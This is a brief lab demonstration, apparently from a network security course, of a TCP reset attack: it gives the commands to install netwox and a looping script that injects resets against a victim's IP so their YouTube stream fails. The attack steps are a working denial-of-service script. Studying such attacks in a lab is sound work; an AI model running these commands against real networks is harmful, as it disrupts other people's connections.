## TCP Reset Attack Demo

Steps:

1. Attacker: Install netwox on the attacker machine:

```console
$ sudo apt install netwox
```

2. Attacker: Save these lines in a bash script named reset_attack.sh:

```console
for i in {1..10000}; do
  sudo netwox 78 -f "src host 10.0.2.4"
done
```

**Note**: change 10.0.2.4 to the victim client's IP address.

3. Victim: watch a video on Youtube.

4. Attacker: launch attack:

```console
$ sudo bash reset_attack.sh
```

Now the victim should feel the network connection struggle and very likely won't be able to continue watching.
